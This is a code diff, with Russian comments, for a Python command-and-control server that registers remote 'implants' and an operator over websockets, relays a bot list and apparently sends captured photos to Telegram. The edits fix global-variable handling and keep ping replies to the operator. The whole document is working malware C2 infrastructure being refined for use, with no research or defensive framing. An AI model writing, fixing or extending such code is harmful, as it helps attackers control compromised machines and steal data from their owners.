@@ -1,11 +1,12 @@
-# --- ФАЙЛ: c2_server.py (Финальная версия с ответом на ping) ---
-# Исправлена фундаментальная ошибка: сервер теперь отвечает на ping от оператора.
+# --- ФАЙЛ: c2_server.py (Финальная версия с ключом `global`) ---
+# Исправлена фундаментальная ошибка: nonlocal заменен на global.
 
 import asyncio, json, os, threading, base64
 import requests
 from aiohttp import web
 import settings
 
+# --- Глобальные переменные ---
 IMPLANTS, OPERATOR = {}, None
 
 def send_telegram_photo(caption, photo_data):
@@ -42,8 +43,9 @@ async def report_handler(request):
         return web.Response(status=500)
 
 async def websocket_handler(request):
+    # <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ: ПРАВИЛЬНЫЙ КЛЮЧ ДОСТУПА >>>
     global OPERATOR, IMPLANTS
-    # aiohttp сам обрабатывает heartbeat от имплантов, но пинги от оператора - наша задача.
+
     ws = web.WebSocketResponse(heartbeat=25.0)
     await ws.prepare(request)
     client_type, client_id = None, None
@@ -52,13 +54,16 @@ async def websocket_handler(request):
         initial_msg = await ws.receive_json(timeout=30.0)
         client_type = initial_msg.get('type')
 
-        if client_type == 'operator': OPERATOR = ws; print("[+] Оператор подключился."); await broadcast_bot_list()
-        elif client_type == 'implant' and 'id' in initial_msg: client_id = initial_msg.get('id'); IMPLANTS[client_id] = ws; print(f"[+] Имплант на связи: {client_id}"); await broadcast_bot_list()
-        else: await ws.close(); return ws
+        if client_type == 'operator':
+            OPERATOR = ws; print("[+] Оператор подключился."); await broadcast_bot_list()
+        elif client_type == 'implant' and 'id' in initial_msg:
+            client_id = initial_msg.get('id')
+            IMPLANTS[client_id] = ws; print(f"[+] Имплант на связи: {client_id}"); await broadcast_bot_list()
+        else:
+            await ws.close(); return ws
 
         async for msg in ws:
             if msg.type == web.WSMsgType.TEXT:
-                # <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ: ОТВЕЧАЕМ НА "ЛАЙ" СТОРОЖЕВОГО ПСА >>>
                 if msg.data == 'ping':
                     await ws.send_str('pong')
                     continue
